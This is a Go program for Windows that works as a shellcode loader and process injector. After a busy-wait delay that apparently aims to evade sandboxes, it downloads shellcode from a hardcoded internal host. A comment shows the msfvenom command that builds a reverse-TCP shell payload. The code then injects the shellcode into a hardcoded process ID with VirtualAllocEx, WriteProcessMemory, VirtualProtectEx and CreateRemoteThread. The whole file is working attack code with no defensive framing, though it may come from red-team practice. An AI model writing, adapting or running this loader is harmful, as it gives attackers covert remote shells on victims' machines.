package main 
import (
	"fmt"
	"io"
	"log"
	"net/http"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
	"time"
)

func main(){

	//time.Sleep(10 *time.Second)
	//===Declare two variables that track the start and current time
	var t0, t1 time.Time 
	fmt.Println("Sleeping for 10 seconds")

	//Record current time as the start time(t0)	
	t0=time.Now()

	//start an infinite loop that will run until 10 seconds have passed
	for{
		//Get the current time on each iteration
		t1=time.Now()

		//Calculate the difference/duration between start time and current time
		diff:=t1.Sub(t0)

		//Check if elapsed time is great than 10 seconnds
		//diff.Seconds() converts the duration to a floating point number of seconds
		if diff.Seconds()>10{
			//if 10 seconds have passed break from the loop
			break
		}
	}


	fmt.Println("Finally...waking up now!!")
	//Target Process ID- Hardcoded PID of the process to inject into
	pid:=uint32(18364)

	//Procees_ALL_ACCESS- full access rights to manipulate process
	PROCESS_ALL_ACCESS:=windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	//Download shellcode from server
	//NOTE: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f raw -o basic_reverse.raw
	sc, err:=wget("http://192.168.1.108:9000/main.bin")

	if err != nil{
		log.Fatalf("[-] Unable to connect to the host: %v", err)
	}

	//Open Handle to target process with full access rights
	fmt.Printf("[+]Getting a handle on process with pid: %d\n", pid)
	pHandle, err:=windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)

	if err != nil{
		log.Fatalf("[-] Unable to get a handle on process with id: %d : %v", pid, err)
	}
	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	//Load kerne32.dll dynamically to acces windows API funcs
	modkernel32:=syscall.NewLazyDLL("kernel32.dll")

	//Get pointer to VirtualAllocEx function- allocate memory in remote process
	procVirtualAllocEx:=modkernel32.NewProc("VirtualAllocEx")

	//Allocate memory in the target process for the shellcode
	addr, _, lastErr:=procVirtualAllocEx.Call(
		uintptr(pHandle), //Handle tot the target process
		uintptr(0), //let system decide allocation of addresses.
		uintptr(len(sc)), //size needed for the shoolcode
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), //Reserve and commit memory
		uintptr(windows.PAGE_READWRITE))  //INITIAL PROTEction

	if addr==0{
		log.Fatalf("[-]VirtualAlloc Failed: %v\n", lastErr)
	}
	fmt.Printf("[+]Allocated memory Address: 9x%x\n", addr)

	//Write the shellcode into the allocated memory in remote process
	var numberOfBytesWritten uintptr
	err=windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)

	if err!=nil{
		log.Fatalf("[-]Unable to write shellcode to the allocated address")
	}
	fmt.Printf("[+]Wrote %d%d bytes to destination address\n", numberOfBytesWritten, len(sc))

	//Change memory protection to allow execution
	var oldProtect uint32

	err=windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil{
		log.Fatalf("[-]VirtualProtect Failed: %v", err)
	}

	//create a remote thread in the target process that starts executing the shellcode
	procCreateRemoteThread:=modkernel32.NewProc("CreateRemoteThread")
	var threadId uint32=0
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle), //Handle to target process
		uintptr(0), //Security attribute
		uintptr(0),  //stack size(default)
		addr, //Start address- Pointer to our shellcode
		uintptr(0), //Parameter to pass to thread fucntion
		uintptr(0), //Creation flags(0=run immediately)
		uintptr(unsafe.Pointer(&threadId)),) //Pointer to receive thread
	
	if tHandle==0{
		log.Fatalf("[-]Unable to Create Remote Thread: %v\n", lastErr)
	}

	fmt.Printf("[+]Handle to newly created thread: 0x%x \n[+]Thread ID: %d\n", tHandle, threadId)

	//Note: Wiat for SIngleObject call is commented out
	//This would wait for the thread to complete but its not needed for shellcode execution
	//windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}
func wget(url string)([]byte, error){
	resp, err:=http.Get(url)
	if err !=nil{
		return []byte{}, err
	}
	defer resp.Body.Close()//ensures response body is closed

	body, err:=io.ReadAll(resp.Body)
	if err!=nil{
		return []byte{}, err 
	}
	return body, nil
}